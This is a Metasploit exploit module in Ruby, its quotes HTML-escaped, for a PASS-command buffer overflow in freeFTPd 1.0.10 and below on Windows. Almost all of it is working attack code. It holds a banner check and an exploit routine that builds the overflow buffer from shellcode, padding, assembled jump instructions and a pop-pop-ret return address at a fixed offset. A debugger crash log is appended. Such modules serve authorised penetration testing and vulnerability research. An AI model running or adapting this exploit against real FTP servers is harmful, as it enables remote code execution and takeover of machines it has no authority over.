# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Ftp

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "freeFTPd PASS Command Buffer Overflow",
      &#039;Description&#039;    => %q{
        freeFTPd 1.0.10 and below contains an overflow condition that is triggered as
        user-supplied input is not properly validated when handling a specially crafted
        PASS command. This may allow a remote attacker to cause a buffer overflow,
        resulting in a denial of service or allow the execution of arbitrary code.

        FreeFTPd must have an account set to authorization anonymous user account.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Wireghoul&#039;, # Initial discovery, PoC
          &#039;TecR0c <roccogiovannicalvi[at]gmail.com>&#039;, # Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [&#039;OSVDB&#039;, &#039;96517&#039;],
          [&#039;EDB&#039;,   &#039;27747&#039;],
          [&#039;BID&#039;,   &#039;61905&#039;]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;BadChars&#039;   => "\x00\x0a\x0d",
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Arch&#039;           => ARCH_X86,
      &#039;Targets&#039;        =>
        [
          [&#039;freeFTPd 1.0.10 and below on Windows Desktop Version&#039;,
            {
              &#039;Ret&#039;    => 0x004014bb, # pop edi # pop esi # ret 0x04 [FreeFTPDService.exe]
              &#039;Offset&#039; => 801,
            }
          ],
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "Aug 20 2013",
      &#039;DefaultTarget&#039;  => 0))

    register_options([
      OptString.new(&#039;FTPUSER&#039;, [ true, &#039;The username to authenticate with&#039;, &#039;anonymous&#039; ]),

    ], self.class)

    # We&#039;re triggering the bug via the PASS command, no point to have pass as configurable
    # option.
    deregister_options(&#039;FTPPASS&#039;)

  end

  def check

    connect
    disconnect

    # All versions including and above version 1.0 report "220 Hello, I&#039;m freeFTPd 1.0"
    # when banner grabbing.
    if banner =~ /freeFTPd 1\.0/
      return Exploit::CheckCode::Detected
    else
      return Exploit::CheckCode::Safe

    end
  end

  def exploit

    connect
    print_status("Trying target #{target.name} with user #{user()}...")

    off = target[&#039;Offset&#039;] - 9

    bof = payload.encoded
    bof << rand_text(off - payload.encoded.length)
    bof << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-" + off.to_s).encode_string
    bof << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-5").encode_string
    bof << rand_text(2)
    bof << [target.ret].pack(&#039;V&#039;)

    send_user(datastore[&#039;FTPUSER&#039;])
    raw_send("PASS #{bof}\r\n")
    disconnect

  end
end

=begin
(c78.ea4): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=0012b324 ebx=01805f28 ecx=00000019 edx=00000057 esi=4141413d edi=00181e18
eip=76c23e8d esp=0012b310 ebp=0012b328 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
OLEAUT32!SysFreeString+0x55:
76c23e8d ff36            push    dword ptr [esi]      ds:0023:4141413d=????????

FAULTING_IP:
OLEAUT32!SysFreeString+55
76c23e8d ff36            push    dword ptr [esi]

EXCEPTION_RECORD:  ffffffff -- (.exr 0xffffffffffffffff)
ExceptionAddress: 76c23e8d (OLEAUT32!SysFreeString+0x00000055)
   ExceptionCode: c0000005 (Access violation)
  ExceptionFlags: 00000000
NumberParameters: 2
   Parameter[0]: 00000000
   Parameter[1]: 4141413d
Attempt to read from address 4141413d
=end

